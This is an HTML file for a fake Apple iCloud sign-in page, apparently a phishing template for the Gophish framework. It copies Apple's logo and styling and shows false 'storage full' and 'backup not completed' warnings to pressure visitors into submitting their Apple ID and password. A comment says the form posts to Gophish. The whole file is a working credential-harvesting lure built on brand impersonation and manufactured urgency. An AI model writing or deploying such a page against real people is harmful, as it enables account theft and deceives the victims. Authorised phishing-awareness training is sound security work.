<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in with Apple ID</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 380px;
        }

        .logo {
            text-align: center;
            margin-bottom: 32px;
        }

        .card {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            padding: 48px 40px;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            color: #1d1d1f;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-size: 17px;
            color: #86868b;
            margin-bottom: 32px;
            text-align: center;
        }

        .alert {
            background: linear-gradient(135deg, #fff5f5 0%, #ffe5e5 100%);
            border-left: 4px solid #ff3b30;
            padding: 14px 16px;
            margin-bottom: 24px;
            border-radius: 8px;
        }

        .alert-text {
            color: #ff3b30;
            font-size: 13px;
            line-height: 1.5;
            font-weight: 500;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #1d1d1f;
            margin-bottom: 6px;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 12px 14px;
            font-size: 17px;
            border: 1px solid #d1d1d6;
            border-radius: 8px;
            background: #ffffff;
            color: #1d1d1f;
            transition: border-color 0.2s, box-shadow 0.2s;
        }

        input::placeholder {
            color: #86868b;
        }

        input:hover {
            border-color: #a8a8ae;
        }

        input:focus {
            outline: none;
            border-color: #0071e3;
            box-shadow: 0 0 0 3px rgba(0,113,227,0.1);
        }

        .button {
            width: 100%;
            padding: 12px;
            font-size: 17px;
            font-weight: 500;
            background-color: #0071e3;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }

        .button:hover {
            background-color: #0062cc;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 16px;
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            text-align: center;
            margin: 32px 0;
            position: relative;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background-color: #e5e5ea;
        }

        .divider span {
            background-color: #ffffff;
            padding: 0 16px;
            position: relative;
            font-size: 13px;
            color: #86868b;
        }

        .create-link {
            display: block;
            text-align: center;
            color: #0071e3;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .create-link:hover {
            text-decoration: underline;
        }

        .storage-info {
            background-color: #f5f5f7;
            border-radius: 8px;
            padding: 16px;
            margin-top: 20px;
        }

        .storage-bar {
            height: 6px;
            background-color: #d1d1d6;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 12px;
        }

        .storage-fill {
            height: 100%;
            width: 98%;
            background: linear-gradient(90deg, #ff3b30 0%, #ff6b6b 100%);
        }

        .storage-text {
            color: #1d1d1f;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 4px;
        }

        .storage-subtext {
            color: #86868b;
            font-size: 12px;
        }

        .footer {
            text-align: center;
            margin-top: 24px;
            font-size: 12px;
            color: #86868b;
        }

        .footer a {
            color: #0071e3;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg width="48" height="48" viewBox="0 0 48 48" fill="none">
                <path d="M36.5 23.5c0-1.2.4-2.3 1.1-3.2-.9-1.3-2.3-2.1-3.9-2.2-1.7-.2-3.3.9-4.1.9-.9 0-2.2-.9-3.6-.9-1.9 0-3.6 1.1-4.5 2.7-2 3.4-.5 8.5 1.4 11.3 1 1.3 2.1 2.8 3.6 2.8 1.4-.1 2-.9 3.6-.9 1.7 0 2.1.9 3.6.9 1.5 0 2.6-1.4 3.6-2.7.7-.9 1.2-2 1.5-3.1-1.7-.7-2.8-2.4-2.8-4.3z" fill="#000000"/>
                <path d="M33 15.5c.8-1 1.3-2.3 1.1-3.7-1.2.1-2.3.7-3.1 1.7-.8 1-1.2 2.2-1.1 3.5 1.2.1 2.3-.6 3.1-1.5z" fill="#000000"/>
            </svg>
        </div>

        <div class="card">
            <h1>Sign in</h1>
            <p class="subtitle">to iCloud</p>

            <div class="alert">
                <p class="alert-text">
                    ⚠️ Your iCloud storage is full (4.9 GB of 5 GB used). Sign in to manage your storage.
                </p>
            </div>

            <form id="loginForm" method="POST">
                <div class="form-group">
                    <label for="email">Apple ID</label>
                    <input type="email" id="email" name="email" placeholder="name@example.com" required autofocus>
                </div>

                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>

                <button type="submit" class="button">Sign In</button>

                <a href="#" class="forgot-link">Forgot Apple ID or password?</a>
            </form>

            <div class="storage-info">
                <div class="storage-bar">
                    <div class="storage-fill"></div>
                </div>
                <p class="storage-text">iCloud Storage: 4.9 GB of 5 GB</p>
                <p class="storage-subtext">Your backup hasn't completed in 7 days</p>
            </div>

            <div class="divider">
                <span>or</span>
            </div>

            <a href="#" class="create-link">Create your Apple ID</a>
        </div>

        <div class="footer">
            <a href="#">Privacy Policy</a> • <a href="#">Terms of Service</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Let form submit naturally to Gophish
        });
    </script>
</body>
</html>
